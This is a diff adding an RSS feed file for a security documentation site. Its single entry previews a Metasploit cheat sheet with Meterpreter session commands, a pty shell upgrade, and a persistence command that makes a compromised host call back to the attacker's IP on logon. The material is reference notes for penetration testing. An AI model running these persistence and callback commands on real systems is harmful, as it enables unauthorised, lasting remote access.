@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Tool on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/tool/</link>
+    <description>Recent content in Tool on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 15:56:12 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/tool/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Metasploit Cheat Sheets</title>
+      <link>https://documentnation.github.io/docs/hdks/tool/metasploit-cheat-sheets/</link>
+      <pubDate>Sat, 07 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/tool/metasploit-cheat-sheets/</guid>
+      <description>Msfconsole linkNo content yet.&#xA;Meterpreter link # List all sessions running on background msf&amp;gt; sessions # Start interacting with the session msf&amp;gt; sessions &amp;lt;session-id&amp;gt; # Drop into a system command shell meterpreter&amp;gt; shell # Upgrade to full functional shell python3 -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Persistence at the target system # -h: Help meterpreter&amp;gt; run persistence -h # -U: Automatically start when the user logs on # -i: The interal in seconds between each connection attempt # -p: The port on which the system running Metesploit is listening # -r: The IP of the system running Metasploit listening for the connect back meterpreter&amp;gt; run persistence -U -i 5 -p 443 -r &amp;lt;local-ip&amp;gt; Msfvenom linkNo content yet.</description>
+    </item>
+  </channel>
+</rss>
